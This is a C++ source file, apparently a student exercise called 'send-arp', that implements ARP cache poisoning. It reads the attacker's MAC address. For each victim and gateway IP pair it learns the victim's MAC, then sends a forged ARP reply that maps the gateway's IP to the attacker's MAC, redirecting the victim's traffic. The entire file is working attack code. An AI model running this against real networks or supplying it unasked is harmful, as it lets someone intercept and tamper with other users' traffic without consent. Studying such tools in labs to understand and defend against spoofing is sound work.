#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "pch.h"


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct MacIp {
	MacIp(Mac mac, Ip ip){
		this->mac_ = mac;
		this->ip_ = ip;
	}
	Mac mac_;
	Ip ip_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <src_ip> <des_ip>\n");
	printf("sample: send-arp wlan0\n");
}

Mac get_attacker_mac(const char *interface){
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		printf("Fail create socket.\n");
		return Mac();
	}

	ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
		printf("Fail get mac address.\n");
		close(sockfd);
		return Mac();
	}

	close(sockfd);

	uint8_t mac_byte[6];
	memcpy(mac_byte, ifr.ifr_hwaddr.sa_data, 6);
 	Mac att_mac(mac_byte);
	return att_mac;
}

Mac get_arp(pcap_t* pcap, Ip src, Ip target){
	while(true){
		pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			return Mac("");
		}

		EthHdr* eth = (EthHdr *)packet;
		packet += sizeof(EthHdr);
		ArpHdr* arp = (ArpHdr *)packet;

		if(ntohs(eth->type_) == eth_header::arp && arp->tip_.compare(target) && arp->sip_.compare(src))
			return Mac(arp->smac_);
	}
}


void send_arp(const char *interface, Mac src_mac, MacIp src_macip, Mac des_mac, MacIp des_macip, uint16_t mode){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface, 0, 0, 0, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = des_mac;
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(eth_header::arp);

	packet.arp_.hrd_ = htons(HWType::ETHER);
	packet.arp_.pro_ = htons(eth_header::ip4);
	packet.arp_.hln_ = Mac::size;
	packet.arp_.pln_ = Ip::size;
	packet.arp_.op_ = htons(mode);
	packet.arp_.smac_ = src_macip.mac_; 
	packet.arp_.sip_ = src_macip.ip_; 
	packet.arp_.tmac_ = des_macip.mac_;
	packet.arp_.tip_ = des_macip.ip_; 
	
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
	pcap_close(pcap);
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		usage();
		return 0;
	}

	const char *interface = argv[1];

	//get mac address
	Mac att_mac = get_attacker_mac(interface);
	// mac 주소를 확인 시 주석 제거
	// att_mac.print();

	Ip unkown_ip("0.0.0.0");
	Mac broad_mac("FF:FF:FF:FF:FF:FF");
	Mac unkown_mac("00:00:00:00:00:00");

	for(int i = 2; i < argc; i += 2){
		Ip vic_ip(argv[i]);
		Ip gate_ip(argv[i + 1]);
		
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
		if (pcap == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
			return EXIT_FAILURE;
		}
		
		send_arp(interface, att_mac, MacIp(att_mac, gate_ip), broad_mac, MacIp(unkown_mac, vic_ip), OP::Request);
		Mac vic_mac = get_arp(pcap, vic_ip, gate_ip);
		// // 상대방의 mac을 출력 시 주석 제거
		// printf("----victim----\n");
		// printf("mac : "); vic_mac.print();
		// printf("ip  : "); vic_ip.print();
		// printf("--------------\n");

		send_arp(interface, att_mac, MacIp(att_mac, gate_ip), vic_mac, MacIp(vic_mac, vic_ip), OP::Reply);

		pcap_close(pcap);
	}
}

